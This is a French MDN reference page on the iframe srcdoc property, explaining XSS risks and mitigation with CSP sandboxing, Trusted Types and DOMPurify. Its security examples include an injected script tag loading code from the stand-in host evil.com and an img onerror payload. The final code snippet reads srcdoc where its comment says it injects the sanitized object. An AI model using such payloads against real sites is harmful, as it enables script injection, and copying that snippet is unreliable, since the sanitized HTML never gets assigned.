---
title: "HTMLIFrameElement : propriété srcdoc"
short-title: srcdoc
slug: Web/API/HTMLIFrameElement/srcdoc
l10n:
  sourceCommit: 65cbd4ff030e6763d6868917137d728c3ec29288
---

{{APIRef("HTML DOM")}}

> [!WARNING]
> Cette propriété analyse son entrée comme du HTML et écrit le résultat dans le DOM du cadre.
> Les API de ce type sont appelées [puits d'injection](/fr/docs/Web/API/Trusted_Types_API#concepts_et_utilisation) et peuvent constituer un vecteur d'[attaque par script intersite (XSS)](/fr/docs/Web/Security/Attacks/XSS) si l'entrée provient d'un·e attaquant·e.
>
> Vous pouvez atténuer ce risque en assignant toujours des objets `TrustedHTML` au lieu de chaînes de caractères et en [imposant les types de confiance](/fr/docs/Web/API/Trusted_Types_API#utiliser_un_csp_pour_appliquer_des_types_approuvés).
> Voir [Considérations de sécurité](#considérations_de_sécurité) pour plus d'informations.

La propriété **`srcdoc`** de l'interface {{DOMxRef("HTMLIFrameElement")}} permet d'obtenir ou de définir le balisage HTML en ligne du document du cadre.

Cela reflète l'attribut [`srcdoc`](/fr/docs/Web/HTML/Reference/Elements/iframe#srcdoc) de l'élément HTML {{HTMLElement("iframe")}}.

## Valeur

Obtenir la propriété retourne une chaîne de caractères contenant la sérialisation HTML du document du cadre.
Cette valeur est `undefined` si elle n'est pas définie.

Définir la propriété accepte soit un objet {{DOMxRef("TrustedHTML")}}, soit une chaîne de caractères.
L'entrée est analysée comme un document HTML et remplace le contenu du cadre par le résultat.

### Exceptions

- `TypeError`
  - : Levée si la propriété est définie sur une chaîne de caractères lorsque les [Trusted Types](/fr/docs/Web/API/Trusted_Types_API) sont [imposés par une CSP](/fr/docs/Web/API/Trusted_Types_API#utiliser_un_csp_pour_appliquer_des_types_approuvés) et qu'aucune politique par défaut n'est définie.

## Description

La propriété **`srcdoc`** reflète le contenu de l'attribut [`srcdoc`](/fr/docs/Web/HTML/Reference/Elements/iframe#srcdoc) de l'élément `<iframe>` et peut être utilisée pour définir ou obtenir le document HTML appartenant à l'élément HTML {{HTMLElement("iframe")}}.

Lors de l'affectation, l'entrée doit définir un document HTML valide, incluant la {{Glossary("doctype", "directive doctype")}}, {{HTMLElement("html")}}, {{HTMLElement("body")}} et d'autres balises.
Notez cependant que les navigateurs sont généralement tolérants au balisage invalide et tentent de rendre le contenu même s'il ne contient que le corps.

Tout balisage pris en charge par le navigateur sera analysé/sérialisé, y compris les {{Glossary("shadow tree", "arbre d'ombre")}}.

Notez que si cette propriété est définie, elle écrasera toute valeur définie dans la propriété {{DOMxRef("HTMLIFrameElement.src", "src")}}.

### Considérations de sécurité

La propriété `srcdoc` permet par défaut à n'importe quel balisage HTML de s'exécuter dans un cadre.
Si le cadre n'est pas isolé à l'aide de la directive [`sandbox`](/fr/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/sandbox) de la politique de sécurité du contenu (CSP) (ou s'il est isolé mais inclut la valeur [`allow-same-origin`](/fr/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/sandbox#allow-same-origin)), il sera de même origine que le parent.
Cela signifie que le cadre aura un accès complet au DOM et aux ressources du parent, et inversement.

Il s'agit d'un vecteur important pour les attaques par [script intersite (XSS)](/fr/docs/Web/Security/Attacks/XSS) si des chaînes potentiellement non sûres fournies par un·e utilisateur·ice sont injectées dans un cadre sans être d'abord assainies.
Considérez le code suivant où une chaîne HTML provenant d'un·e utilisateur·ice pourrait être passée dans un cadre qui est ensuite ajouté au document.

```js
const untrustedStringFromUser = `<!doctype html><script src="http://evil.com/naughty.js"></script>`;
const iframe = document.createElement("iframe");
iframe.srcdoc = untrustedStringFromUser;
document.body.appendChild(iframe);
```

Si le cadre n'a pas besoin d'accéder à votre document parent, vous pouvez atténuer le risque en utilisant un CSP sandbox sans la valeur `allow-same-origin`.
Le cadre sera alors traité comme une ressource inter-origines et les attaques seront fortement limitées.
Vous pouvez également utiliser une CSP plus générale pour restreindre les emplacements à partir desquels les scripts et autres ressources peuvent être récupérés.

Vous pouvez encore réduire le risque en assignant toujours des objets {{DOMxRef("TrustedHTML")}} au lieu de chaînes de caractères, et en [imposant les types de confiance](/fr/docs/Web/API/Trusted_Types_API#utiliser_un_csp_pour_appliquer_des_types_approuvés) à l'aide de la directive CSP [`require-trusted-types-for`](/fr/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/require-trusted-types-for).
Cela garantit que l'entrée passe par une fonction de transformation, qui a la possibilité d'[assainir](/fr/docs/Web/Security/Attacks/XSS#assainissement) l'entrée pour supprimer tout balisage potentiellement dangereux avant son injection.

## Exemples

### Lire le HTML d'un cadre intégré

Lire `srcdoc` fait que l'agent utilisateur sérialise le document du cadre (<i lang="en">iframe</i> en anglais).

Avec le HTML suivant&nbsp;:

```html
<iframe
  id="example"
  srcdoc="<!doctype html><body><p>Bonjour le monde&nbsp;!</p></body>"></iframe>
```

Vous pouvez obtenir et afficher le balisage comme suit&nbsp;:

```js
const frame = document.querySelector("#example");
const frameDoc = frame.srcdoc;
console.log(frameDoc); // "<!doctype html><body><p>Bonjour le monde&nbsp;!</p></body>"
```

### Remplacer la source en ligne du cadre

Dans cet exemple, nous allons remplacer le document d'un cadre en affectant du HTML à sa propriété `srcdoc`.
Pour atténuer le risque de XSS, nous allons d'abord créer un objet `TrustedHTML` à partir de la chaîne contenant le HTML, puis affecter cet objet à `srcdoc`.

Les types de confiance ne sont pas encore pris en charge sur tous les navigateurs, donc nous définissons d'abord le [trusted types tinyfill](/fr/docs/Web/API/Trusted_Types_API#types_de_confiance_tinyfill).
Cela agit comme un remplacement transparent pour l'API JavaScript `Trusted Types`&nbsp;:

```js
if (typeof trustedTypes === "undefined")
  trustedTypes = { createPolicy: (n, rules) => rules };
```

Ensuite, nous créons une {{DOMxRef("TrustedTypePolicy")}} qui définit une méthode {{DOMxRef("TrustedTypePolicy/createHTML", "createHTML()")}} pour transformer une chaîne d'entrée en instance de {{DOMxRef("TrustedHTML")}}.
Généralement, les implémentations de `createHTML()` utilisent une bibliothèque comme [DOMPurify <sup>(angl.)</sup>](https://github.com/cure53/DOMPurify) pour assainir l'entrée, comme ci-dessous&nbsp;:

```js
const policy = trustedTypes.createPolicy("my-policy", {
  createHTML: (input) => DOMPurify.sanitize(input),
});
```

Nous utilisons ensuite cet objet `policy` pour créer un objet `TrustedHTML` à partir de la chaîne d'entrée potentiellement non sûre, et affectons le résultat à l'élément&nbsp;:

```js
// La chaîne potentiellement malveillante
const untrustedString =
  "<!doctype html><body><p>Je pourrais être une XSS</p><img src='x' onerror='alert(1)'></body>";

// Créer une instance TrustedHTML à l'aide de la policy
const trustedHTML = policy.createHTML(untrustedString);

// Injecter le TrustedHTML (qui contient une chaîne de confiance)
const frame = document.querySelector("#example");
const frameDoc = frame.srcdoc;
```

> [!WARNING]
> Bien que vous puissiez affecter directement une chaîne à `srcdoc`, cela représente un [risque de sécurité](#considérations_de_sécurité) si la chaîne à insérer peut contenir du contenu potentiellement malveillant.
> Vous devez utiliser `TrustedHTML` pour vous assurer que le contenu est assaini avant d'être inséré, et définir un en-tête CSP pour [imposer les types de confiance](/fr/docs/Web/API/Trusted_Types_API#utiliser_un_csp_pour_appliquer_des_types_approuvés).

## Spécifications

{{Specifications}}

## Compatibilité des navigateurs

{{Compat}}
